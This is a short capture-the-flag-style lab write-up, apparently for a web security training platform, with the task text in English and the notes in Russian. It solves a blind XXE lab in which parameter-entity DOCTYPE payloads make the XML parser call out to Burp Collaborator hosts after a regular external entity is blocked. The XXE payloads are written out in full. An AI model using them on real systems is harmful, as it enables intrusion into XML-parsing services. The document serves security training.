# Blind XXE with out-of-band interaction via XML parameter entities
PRACTITIONER

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Решение
Отправлю стандартный XML с внешней сущностью:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any [<!ENTITY dummy SYSTEM "2sv8kjylzw24ktz6ijr8lle07rdi19py.oastify.com"]>
<stockCheck>
<productId>1</productId>
<storeId>&dummy;</storeId>
</stockCheck>
```
Ответ: `"Entities are not allowed for security reasons"`

Вместо использования в теле XML внешней сущности объявлю т.н. "parameter entity" и применю его внутри DOCTYPE: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % dummy SYSTEM "http://udb05bjdkonw5lky3bc06dzssjyam2ar.oastify.com"> %dummy; ]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```
Задание выполнено.

Странно, но так тоже работает (`<!DOCTYPE any`):
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any [<!ENTITY % dummy SYSTEM "http://uwu0ob2d3o6wol3ymbv0pdisbjha58tx.oastify.com"> %dummy; ]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```